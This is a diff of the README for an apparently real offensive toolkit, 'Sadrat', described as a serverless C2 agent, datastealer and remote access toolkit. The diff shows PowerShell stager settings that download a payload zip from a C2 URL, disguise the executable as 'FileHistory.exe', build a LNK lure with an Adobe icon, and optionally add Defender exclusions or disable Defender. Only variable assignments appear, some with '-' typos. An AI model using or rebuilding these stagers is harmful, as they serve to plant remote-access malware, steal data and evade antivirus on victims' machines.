@@ -1,12 +1,12 @@
-## Sadrat C2
+## Sadrat
 
-### Serverless Agent Datastealer and Remote Access Toolkit
+### Serverless C2 Agent, Datastealer and Remote Access Toolkit
 
 #### Stagers
 
 ##### LnkGen.ps1 - Generate a LNK Stager
 ```powershell
-$url = "" # "https://c2.server.com/api/assets/fhZip"
+$url = "" # "https://c2.serverless.com/api/assets/fhZip"
 $zipName - "" # "fh.zip"
 $exeName = "" # "FileHistory.exe"
 $lnkPath = "" # ".\sadrat.lnk"
@@ -17,7 +17,7 @@ $iconPath = "" # ".\adobe.png"
 
 ##### SimpleStager - Drops to current Folder 
 ```powershell
-$url = "" # "https://c2.server.com/api/assets/fhZip"
+$url = "" # "https://c2.serverless.com/api/assets/fhZip"
 $zipName - "" # "fh.zip"
 $exeName = "" # "FileHistory.exe"
 
@@ -26,7 +26,7 @@ $exeName = "" # "FileHistory.exe"
 
 ##### Stager.ps1 - Admin checks for install paths and optionally defender exlucsions/disabling
 ```powershell
-$url = "" # "https://c2.server.com/api/assets/fhZip"
+$url = "" # "https://c2.serverless.com/api/assets/fhZip"
 $zipName - "" # "fh.zip"
 $exeName = "" # "FileHistory.exe"
 
@@ -35,7 +35,7 @@ $exeName = "" # "FileHistory.exe"
 
 ##### azSadrat.ps1 - Run a Stager on Azure VM or over PS-Session 
 ```powershell
-$url = "" # "https://c2.server.com/api/assets/fhZip"
+$url = "" # "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 $vmname = ""
